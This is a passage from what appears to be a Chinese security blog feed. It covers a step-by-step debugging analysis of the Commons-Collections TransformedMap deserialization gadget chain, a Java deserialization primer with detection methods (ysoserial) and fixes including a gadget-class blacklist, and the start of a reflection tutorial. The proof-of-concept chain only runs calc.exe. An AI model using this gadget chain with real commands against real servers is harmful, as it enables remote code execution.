InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //创建Map并绑定transformer</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        //给予map数据转化链</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        //触发漏洞</span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br><span class="line">        onlyElement.setValue(&quot;test&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面逐一分析</p>
<p>先看下面这段代码，<code>ConstantTransformer</code>和<code>InvokerTransformer</code>都是<code>Transformer</code>接口的实现类，通过new创建了一个 Transformer类型的数组，里面存储的是 Transformer的实现类对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<h3 id="ConstantTransformer分析"><a href="#ConstantTransformer分析" class="headerlink" title="ConstantTransformer分析"></a>ConstantTransformer分析</h3><p>先来分析一下<code>ConstantTransformer</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331213802750-70517686.png" alt="image-20220331213801907"></p>
<p>这里是使用了构造方法传入参数，poc中传入的参数为<code>Runtime.class</code>，而在调用到transform时，会返回我们传入的参数，也就是返回这里的<code>iConstant</code>。</p>
<h3 id="InvokerTransformer分析"><a href="#InvokerTransformer分析" class="headerlink" title="InvokerTransformer分析"></a>InvokerTransformer分析</h3><p>打一个debug跟踪到<code>InvokerTransformer</code>类的构造方法里面</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331214255708-71059607.png" alt="image-20220331214256009"></p>
<p>可以看到传入到构造方法中有三个参数，第一个是方法名，第二个是参数类型，第三个是参数的值。</p>
<p>poc里的三个<code>InvokerTransformer</code>的参数值，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getMethod,new Class[]&#123;String.class, Class[].class&#125;,new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;</span><br><span class="line">invoke,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;</span><br><span class="line">exec,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>InvokerTransformer</code>类中同样存在<code>transform</code>方法，后面再具体分析</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331214746603-820866591.png" alt="image-20220331214746902"></p>
<h3 id="ChainedTransformer分析"><a href="#ChainedTransformer分析" class="headerlink" title="ChainedTransformer分析"></a>ChainedTransformer分析</h3><p>poc代码继续往下分析，可以看到如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer transformerChain = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>

<p>将<code>transformers</code>数组传入<code>ChainedTransformer</code>构造方法里面。在构造方法中将<code>transformers</code>赋值给本类的成员变量<code>iTransformers</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215100803-248909615.png" alt="image-20220331215101175"></p>
<p>该类同样存在<code>transform</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215116522-1090283627.png" alt="image-20220331215116950"></p>
<p><code>transform</code>方法的作用会遍历<code>transformers</code>数组，然后逐个去调用它的<code>transform</code>方法。 并且还可以看出该方法会将第一次的执行结果传递给第二次执行的参数里面去。知道了<code>ChainedTransformer</code>的作用后，我们需要知道的是<code>ChainedTransformer</code>的<code>transform</code>什么时候会被调用。继续往下调试</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215715399-2078158251.png" alt="image-20220331215715632"></p>
<p>进入<code>setValue</code>方法，继续跟进，可以在<code>TransformedMap#checkSetValue</code>方法中发现调用了<code>ChainedTransformer</code>的<code>transform</code>方法，这里之前在前置学习中就已经分析过了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215643520-1021755760.png" alt="image-20220331215643925"></p>
<p>后面自然就循环调用每个<code>Transformer</code>的<code>transform</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215923877-1365581574.png" alt="image-20220331215924083"></p>
<p>根据顺序，会调用第一个<code>ConstantTransformer</code>的<code>transform</code>方法，也就是返回构造函数中设置的<code>iConstant</code>，这里就是<code>Runtime.class</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331220100853-1922932681.png" alt="image-20220331220101252"></p>
<p>接着往下，就到了InvokerTransformer，可以看到参数input的值是上个Transformer返回的结果Runtime.class，后面就是利用反射拿到Runtime对象，因为Runtime没有构造方法需要调用getRuntime()方法获取到Runtime对象，所以这里的流程是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getClass().getMethod(&quot;getRuntime&quot;,null).invoke() -&gt; Method</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331220634247-69976373.png" alt="image-20220331220634207"></p>
<p>继续跟，来到第二个<code>InvokerTransformer</code>，分析如上，因为上面获得了一个Method，那么我们就需要调用它的invoke方法来执行，所以这里getMethod方法里的参数值为invoke，第二个参数即参传入的参数类型Object</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331222329052-1798048744.png" alt="image-20220331222329120"></p>
<p>接着往下，来到第三个<code>InvokerTransformer</code>，也就是最后一个<code>Transformer</code>，这里可以看到输入input成功拿到Runtime对象，现在只需要执行<code>Runtime#exe</code>方法即可，同样先通过<code>getMethod</code>方法拿到exec对应的Method，所以这里<code>getMethod</code>的第一个参数，就是exec，第二个参数即exec方法执行的参数类型String，返回method，然后调用invoke执行，参数为calc.exe。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331223102527-1052480704.png" alt="image-20220331223102622"></p>
<p>之后弹出计算器</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331224112146-817721721.png" alt="image-20220331224112138"></p>
<p>整个过程归纳</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过ConstantTransformer得到Runtime.class,然后再InvokerTransformer反射得到getRuntime方法，然后通过反射执行invoke才能去调用getRuntime方法，这样得到一个Runtime对象，然后再去调用Runtime对象的exec方法去达到命令执行。</span><br></pre></td></tr></table></figure>

<h3 id="transform方法调用分析"><a href="#transform方法调用分析" class="headerlink" title="transform方法调用分析"></a>transform方法调用分析</h3><p>分析下poc中<code>TransformedMap#decorate</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></pre></td></tr></table></figure>

<p>调试进入decorate方法，然后跟进来到<code>TransformedMap</code>的构造方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331224824303-1180474727.png" alt="image-20220331224824509"></p>
<p>构造方法把传入的map和Transformer进行赋值。那么要想知道<code>ChainedTransformer</code>是如何调用<code>transform</code>方法，只需在当前类中搜索<code>valueTransformer</code>，因为<code>ChainedTransformer</code>是赋值给<code>valueTransformer</code>的，然后在<code>transformValue</code>方法中发现了transform方法的调用</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225033806-1139569585.png" alt="image-20220331225034010"></p>
<p>继续查找<code>transformValue</code>方法是在哪被调用的，发现在put方法里会调用<code>transformValue</code>方法，从而导致<code>transformValue</code>调用<code>transform</code>方法去执行命令。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225502658-2009025010.png" alt="image-20220331225503104"></p>
<p>所以我们在调用<code>TransformedMap#decorate</code>方法绑定transformer之后，再调用put方法也可触发命令执行。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225850062-1350949135.png" alt="image-20220331225850271"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13779857.html">https://www.cnblogs.com/nice0e3/p/13779857.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞</title>
    <url>/2022/03/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h2 id="序列化与反序列化基础"><a href="#序列化与反序列化基础" class="headerlink" title="序列化与反序列化基础"></a>序列化与反序列化基础</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Java序列化是指把Java对象转换为字节序列的过程；</p>
<p>Java反序列化是指把字节序列恢复为Java对象的过程；</p>
<span id="more"></span>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322102503916-1102489201.png" alt="image-20220322102504287"></p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>序列化最重要的作用：在传递和保存对象时，保证对象的完整性和可传递性。对象转换为有序字节流，以便在网络上传输或者保存在本地文件中。</p>
<p>反序列化的最重要的作用：根据字节流中保存的对象状态及描述信息，通过反序列化重建对象。</p>
<p>   总结：核心作用就是对象状态的保存和重建。（整个过程核心点就是字节流中所保存的对象状态及描述信息）</p>
<p>优点：</p>
<p>①将对象转为字节流存储到硬盘上，当JVM停机的话，字节流还会在硬盘上默默等待，等待下一次JVM的启动，把序列化的对象，通过反序列化为原来的对象，并且序列化的二进制序列能够减少存储空间（永久性保存对象）。</p>
<p>②序列化成字节流形式的对象可以进行网络传输(二进制形式)，方便了网络传输。</p>
<p>③通过序列化可以在进程间传递对象。</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>只有实现了<code>Serializable</code>或者<code>Externalizable</code>接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） </p>
<p>JDK中序列化和反序列化的API：</p>
<ol>
<li><code>java.io.ObjectInputStream</code>：对象输入流。该类的<code>readObject()</code>方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回。</li>
<li><code>java.io.ObjectOutputStream</code>：对象输出流。该类的<code>writeObject(Object obj)</code>方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出。</li>
</ol>
<p>三种实现：</p>
<ol>
<li><p>若Student类仅仅实现了<code>Serializable</code>接口，则可以按照以下方式进行序列化和反序列化.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectOutputStream采用默认的序列化方式，对Student对象的非transient的实例变量进行序列化。 </span><br><span class="line">ObjcetInputStream采用默认的反序列化方式，对Student对象的非transient的实例变量进行反序列化</span><br></pre></td></tr></table></figure>
</li>
<li><p>若Student类仅仅实现了<code>Serializable</code>接口，并且还定义了<code>readObject(ObjectInputStream in)</code>和<code>writeObject(ObjectOutputSteam out)</code>，则按照以下方式进行序列化与反序列化。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectOutputStream调用Student对象的writeObject(ObjectOutputStream out)的方法进行序列化。 </span><br><span class="line">ObjectInputStream会调用Student对象的readObject(ObjectInputStream in)的方法进行反序列化。</span><br></pre></td></tr></table></figure>
</li>
<li><p>若Student类实现了<code>Externalnalizable</code>接口，且Student类必须实现<code>readExternal(ObjectInput in)</code>和<code>writeExternal(ObjectOutput out)</code>方法，则按照以下方式进行序列化与反序列化。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectOutputStream调用Student对象的writeExternal(ObjectOutput out))的方法进行序列化。 </span><br><span class="line">ObjectInputStream会调用Student对象的readExternal(ObjectInput in)的方法进行反序列化。</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package ser;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">class serdemo implements Serializable&#123;</span><br><span class="line">   private String name;</span><br><span class="line">   public String getName()&#123;</span><br><span class="line">       return name;</span><br><span class="line">   &#125;</span><br><span class="line">   public void setName(String name)&#123;</span><br><span class="line">      this.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class serdemo1 &#123;</span><br><span class="line">    public static void main(String args[]) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        #序列化</span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(&quot;seri.txt&quot;);</span><br><span class="line">        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);</span><br><span class="line">        serdemo serdemo=new serdemo();</span><br><span class="line">        serdemo.setName(&quot;test&quot;);</span><br><span class="line">        outputStream.writeObject(serdemo);</span><br><span class="line">        #反序列化</span><br><span class="line">        FileInputStream fileInputStream = new FileInputStream(&quot;seri.txt&quot;);</span><br><span class="line">        ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);</span><br><span class="line">        serdemo object2 = (serdemo) inputStream.readObject();</span><br><span class="line">        System.out.println(&quot;反序列化后的对象的值&quot;);</span><br><span class="line">        System.out.println(object2.getName());</span><br><span class="line">        inputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ol>
<li>序列化时，只对对象的状态进行保存，而不管对象的方法；</li>
<li>当一个父类实现序列化，子类自动实现序列化，不需要显式实现Serializable接口；</li>
<li>当一个对象的实例变量引用其他对象，序列化该对象时也把引用对象进行序列化；</li>
<li>并非所有的对象都可以序列化；</li>
<li>声明为static和transient类型的成员数据不能被序列化。因为static代表类的状态，transient代表对象的临时数据；</li>
<li>如果一个对象的成员变量是一个对象，那么这个对象的数据成员也会被保存。</li>
</ol>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在Java反序列化中，会调用被反序列化的<code>readObject</code>方法，当<code>readObject</code>方法被重写不当时产生漏洞，这里为什么会调用反序列化类的<code>readobject</code>方法，后续做分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class demon &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[]) throws Exception&#123;</span><br><span class="line">        //序列化</span><br><span class="line">        //定义myObj对象</span><br><span class="line">        MyObject myObj = new MyObject();</span><br><span class="line">        myObj.name = &quot;test&quot;;</span><br><span class="line">        //创建一个包含对象进行反序列化信息的”object”数据文件</span><br><span class="line">        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(&quot;object&quot;));</span><br><span class="line">        //writeObject()方法将myObj对象写入object文件</span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        //反序列化</span><br><span class="line">        //从文件中反序列化obj对象</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;object&quot;));</span><br><span class="line">        //恢复对象</span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    static class MyObject implements Serializable &#123;</span><br><span class="line">        public String name;</span><br><span class="line">        //重写readObject()方法</span><br><span class="line">        private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">            //执行默认的readObject()方法</span><br><span class="line">            in.defaultReadObject();</span><br><span class="line">            //执行打开计算器程序命令</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基础库中存在的反序列化漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">commons-logging 1.2</span><br><span class="line">commons-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 2.3.9</span><br><span class="line">org.springframework:spring-aop 4.1.4.RELEASE</span><br></pre></td></tr></table></figure>

<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。</p>
<h3 id="白盒检测"><a href="#白盒检测" class="headerlink" title="白盒检测"></a>白盒检测</h3><p><strong>① 通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点</strong></p>
<ul>
<li>搜索以下函数：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure>

<p><strong>② 确定了反序列化输入点后，再考察应用的<code>Class Path</code>中是否包含<code>Apache Commons Collections</code>等危险库（ysoserial所支持的其他库亦可）。</strong><br><strong>③ 若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。</strong><br><strong>④ 若包含危险库，则使用<a href="https://github.com/frohoff/ysoserial">ysoserial</a>进行攻击复现。</strong></p>
<h3 id="黑盒检测"><a href="#黑盒检测" class="headerlink" title="黑盒检测"></a>黑盒检测</h3><ul>
<li>通过抓包来检测请求中可能存在的序列化数据。</li>
<li>序列化数据通常以<code>AC ED</code>开始，之后的两个字节是版本号，版本号一般是<code>00 05</code>，<code>AC ED 00 05</code>经过<code>Base64</code>编码之后为<code>rO0AB</code></li>
<li>十六进制对照表：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x70 - TC_NULL</span><br><span class="line">0x71 - TC_REFERENCE</span><br><span class="line">0x72 - TC_CLASSDESC</span><br><span class="line">0x73 - TC_OBJECT</span><br><span class="line">0x74 - TC_STRING</span><br><span class="line">0x75 - TC_ARRAY</span><br><span class="line">0x76 - TC_CLASS</span><br><span class="line">0x7B - TC_EXCEPTION</span><br><span class="line">0x7C - TC_LONGSTRING</span><br><span class="line">0x7D - TC_PROXYCLASSDESC</span><br><span class="line">0x7E - TC_ENUM</span><br></pre></td></tr></table></figure>

<p>可以通过tcpdump抓取TCP&#x2F;HTTP请求，通过<a href="https://github.com/NickstaDB/SerialBrute/">SerialBrute.py</a>去自动化检测，并插入<a href="https://github.com/frohoff/ysoserial">ysoserial</a>生成的<code>exp</code></p>
<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><h4 id="通过Hook-resolveClass来校验反序列化的类"><a href="#通过Hook-resolveClass来校验反序列化的类" class="headerlink" title="通过Hook resolveClass来校验反序列化的类"></a>通过Hook resolveClass来校验反序列化的类</h4><p>在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。</p>
<p>检测示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class AntObjectInputStream extends ObjectInputStream&#123;</span><br><span class="line">    public AntObjectInputStream(InputStream inputStream)</span><br><span class="line">            throws IOException &#123;</span><br><span class="line">        super(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 只允许反序列化SerialObject class</span><br><span class="line">     */</span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        if (!desc.getName().equals(SerialObject.class.getName())) &#123;</span><br><span class="line">            throw new InvalidClassException(</span><br><span class="line">                    &quot;Unauthorized deserialization attempt&quot;,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        return super.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用ValidatingObjectInputStream来校验反序列化的类"><a href="#使用ValidatingObjectInputStream来校验反序列化的类" class="headerlink" title="使用ValidatingObjectInputStream来校验反序列化的类"></a>使用ValidatingObjectInputStream来校验反序列化的类</h4><p>使用<code>Apache Commons IO Serialization</code>包中的<code>ValidatingObjectInputStream</code>类的accept方法来实现反序列化类白&#x2F;黑名单控制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static Object deserialize(byte[] buffer) throws IOException,</span><br><span class="line">ClassNotFoundException , ConfigurationException &#123;</span><br><span class="line">	Object obj;</span><br><span class="line">	ByteArrayInputStream bais = new ByteArrayInputStream(buffer);</span><br><span class="line">	// Use ValidatingObjectInputStream instead of InputStream</span><br><span class="line">	ValidatingObjectInputStream ois = new 	ValidatingObjectInputStream(bais); </span><br><span class="line"></span><br><span class="line">	//只允许反序列化SerialObject class</span><br><span class="line">	ois.accept(SerialObject.class);</span><br><span class="line">	obj = ois.readObject();</span><br><span class="line">	return obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用ObjectInputFilter来校验反序列化的类"><a href="#使用ObjectInputFilter来校验反序列化的类" class="headerlink" title="使用ObjectInputFilter来校验反序列化的类"></a>使用ObjectInputFilter来校验反序列化的类</h4><p>Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承<a href="http://download.java.net/java/jdk9/docs/api/java/io/ObjectInputFilter.html">java.io.ObjectInputFilter</a>类重写checkInput方法实现自定义的过滤器，并使用ObjectInputStream对象的<a href="http://download.java.net/java/jdk9/docs/api/java/io/ObjectInputStream.html#setObjectInputFilter-java.io.ObjectInputFilter-">setObjectInputFilter</a>设置过滤器来实现反序列化类白&#x2F;黑名单控制。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.util.List;</span><br><span class="line">import java.util.Optional;</span><br><span class="line">import java.util.function.Function;</span><br><span class="line">import java.io.ObjectInputFilter;</span><br><span class="line">class BikeFilter implements ObjectInputFilter &#123;</span><br><span class="line">	private long maxStreamBytes = 78; // Maximum allowed bytes in the stream.</span><br><span class="line">	private long maxDepth = 1; // Maximum depth of the graph allowed.</span><br><span class="line">	private long maxReferences = 1; // Maximum number of references in a graph.</span><br><span class="line">	@Override</span><br><span class="line">	public Status checkInput(FilterInfo filterInfo) &#123;</span><br><span class="line">		if (filterInfo.references() &lt; 0 || filterInfo.depth() &lt; 0 || filterInfo.streamBytes() &lt; 0 || filterInfo.references() &gt; maxReferences || filterInfo.depth() &gt; maxDepth|| filterInfo.streamBytes() &gt; maxStreamBytes) &#123;</span><br><span class="line">			return Status.REJECTED;</span><br><span class="line">		&#125;</span><br><span class="line">		Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">		if (clazz != null) &#123;</span><br><span class="line">			if (SerialObject.class == filterInfo.serialClass()) &#123;</span><br><span class="line">				return Status.ALLOWED;</span><br><span class="line">			&#125;</span><br><span class="line">			else &#123;</span><br><span class="line">				return Status.REJECTED;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return Status.UNDECIDED;</span><br><span class="line">	&#125; // end checkInput</span><br><span class="line">&#125; // end class BikeFilter</span><br></pre></td></tr></table></figure>

<h4 id="黑名单校验修复"><a href="#黑名单校验修复" class="headerlink" title="黑名单校验修复"></a>黑名单校验修复</h4><ul>
<li>org.apache.commons.collections.functors.InvokerTransformer</li>
<li>org.apache.commons.collections.functors.InstantiateTransformer</li>
<li>org.apache.commons.collections4.functors.InvokerTransformer</li>
<li>org.apache.commons.collections4.functors.InstantiateTransformer</li>
<li>org.codehaus.groovy.runtime.ConvertedClosure</li>
<li>org.codehaus.groovy.runtime.MethodClosure</li>
<li>org.springframework.beans.factory.ObjectFactory</li>
<li>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</li>
<li>org.apache.commons.fileupload</li>
<li>org.apache.commons.beanutils</li>
<li>…</li>
</ul>
<h4 id="安全编码建议"><a href="#安全编码建议" class="headerlink" title="安全编码建议"></a>安全编码建议</h4><ul>
<li>更新commons-collections、commons-io等第三方库版本；</li>
<li>业务需要使用反序列化时，尽量避免反序列化数据可被用户控制，如无法避免建议尽量使用白名单校验的修复方式；</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/tree_ifconfig/article/details/82766587">https://blog.csdn.net/tree_ifconfig/article/details/82766587</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/14127885.html">https://www.cnblogs.com/nice0e3/p/14127885.html</a></p>
<p><a href="https://www.cnblogs.com/yyhuni/p/14755940.html">https://www.cnblogs.com/yyhuni/p/14755940.html</a></p>
<p><a href="https://github.com/Cryin/Paper/blob/master/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8:JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%AE%87.md">https://github.com/Cryin/Paper/blob/master/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8:JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%AE%87.md</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反射机制学习</title>
    <url>/2022/03/17/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>Reflection(反射) 是 Java 程序开发语言的特征之一，反射允许运行中的Java程序在运行时获取一个类的所有信息，可以获取到任何定义的信息（包括成员变量，成员方法，构造器等），并且可以操纵类的字段、方法、构造器等部分，甚至能直接操作程序的私有属性。</p>
<span id="more"></span>

<h2 id="获取class类对象"><a href="#获取class类对象" class="headerlink" title="获取class类对象"></a>获取class类对象</h2><p>我们正常类加载的方式是：</p>
<ul>
<li>导入包名—&gt;通过new实例化—&gt;取得实例化对象</li>
</ul>
<p>而反射可以利用下面三种方法获取字节码对象：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class.forName(&quot;类的全路径&quot;);</span><br><span class="line">类名.class</span><br><span class="line">对象.getClass();</span><br><span class="line">classLoader.loadClass(&quot;类的全路径&quot;); </span><br></pre></td></tr></table></figure>

<p>实现反射相关API：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Class           代表一个类</span><br><span class="line">java.lang.reflect.Method  代表类的方法</span><br><span class="line">java.lang.reflect.Field   代表类的成员属性</span><br><span class="line">java.lang.reflect.Constructor  代表类的构造方法</span><br></pre></td></tr></table></figure>

<p>举个例子</p>
<p>Person.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Person &#123;</span><br><span class="line">    public String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public Person()&#123;&#125;</span><br><span class="line">    public Person(String name, int age) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    public Person(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void 